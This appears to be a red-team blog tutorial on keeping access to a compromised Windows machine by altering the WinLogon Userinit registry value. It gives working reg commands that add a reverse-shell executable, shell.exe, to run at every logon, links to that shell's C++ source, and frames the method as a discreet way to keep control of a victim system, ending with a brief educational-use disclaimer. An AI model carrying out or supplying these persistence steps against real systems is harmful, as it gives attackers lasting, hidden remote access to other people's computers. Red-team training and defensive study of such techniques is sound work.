# Windows Persistence Using WinLogon Reverse Shell

## Introduction
In this guide, I'll walk you through a method to establish persistence on Windows systems by leveraging the widely utilized WinLogon component.

## What is Persistence?
> Note : This guide is part of the HackerSploit Red Team series of guides. To navigate to other guides in the series, visit: https://www.linode.com/docs/guides/windows-red-team-persistence-techniques/

Persistence refers to techniques attackers use to maintain access to a system despite reboots, credential changes, or other disruptions that might otherwise terminate their connection. These methods involve actions, configurations, or code modifications that ensure continued access, such as altering legitimate programs or injecting code into startup processes.

In simpler terms, persistence allows you to keep control over a compromised machine, regaining your access even after the system restarts, without needing to reinfect the target.

## What is WinLogon?

WinLogon is a critical Windows component responsible for managing tasks like user logon, logoff, loading user profiles during authentication, system shutdowns, and handling the lock screen. These actions are controlled via the Windows registry, which specifies what processes launch during logon events. For red team operations, these events can serve as triggers to execute custom payloads, enabling persistent access.

> For more details : https://pentestlab.blog/2020/01/14/persistence-winlogon-helper-dll/

Now that we’ve covered the basics, let’s dive into achieving persistence with WinLogon.

## Proof of Concept (PoC)
For this demonstration, I’ll use a file named `shell.exe`, a reverse shell crafted in C++. You can find the source code here:

[GitHub - S12cybersecurity/Reverse-Shell-C-PlusPlus](https://github.com/S12cybersecurity/Reverse-Shell-C-PlusPlus)  
> Note: This is a modified version of a simple C++ reverse shell, originally shared by cocomelonc.

Let’s get started, assuming an active reverse shell is already running on the target system.

![1](https://github.com/user-attachments/assets/fa09ae81-8c57-48e1-9b8d-11a6839c214e)

### Step 1: Inspect the Registry
Run the following command to check the current `Userinit` value in the WinLogon registry key:

```bash
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit
```

![2](https://github.com/user-attachments/assets/023a98fc-b653-4adc-bd59-aadae5b86b4a)

### Step 2: Confirm the Current Winlogon Setting
First, query the existing value to verify the current state:

```bash
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit
```

You’ll usually see something like:

```text
Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
```

This is the default behavior — it runs the `userinit.exe` process, which is responsible for starting the user environment after login.

![3](https://github.com/user-attachments/assets/e3ae5805-dd8d-48d0-97b5-28d443618735)

### Step 3: Inject Your Shell into the Winlogon Process
Now, we’ll modify this value to include our reverse shell binary (`shell.exe`) alongside the legitimate executable.

Run the following command in an elevated command prompt (as Administrator):

```bash
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /d "C:\Windows\system32\userinit.exe, C:\Users\s12de\Downloads\shell.exe" /f
```
![4](https://github.com/user-attachments/assets/2e8718fc-e82d-4964-986f-f7bf5c4e9868)

This modification ensures that every time a user logs in, logs out, or locks/unlocks their system, both the legitimate `userinit.exe` and your custom reverse shell (`shell.exe`) are executed automatically.

![5](https://github.com/user-attachments/assets/3770d815-4d33-41e5-8fe2-8398fb99b4af)

## Conclusion
Using the **Winlogon Userinit** registry key provides a discreet and persistent method to retain access on a Windows machine.  
Because it’s deeply embedded in the system’s authentication routine, it serves as a dependable point to execute your custom payload.

> ⚠️ **Important:** This information is shared for educational purposes only. Always ensure you have explicit permission before testing or deploying such techniques.

---

Thanks for reading!  
**— Malforge Group**
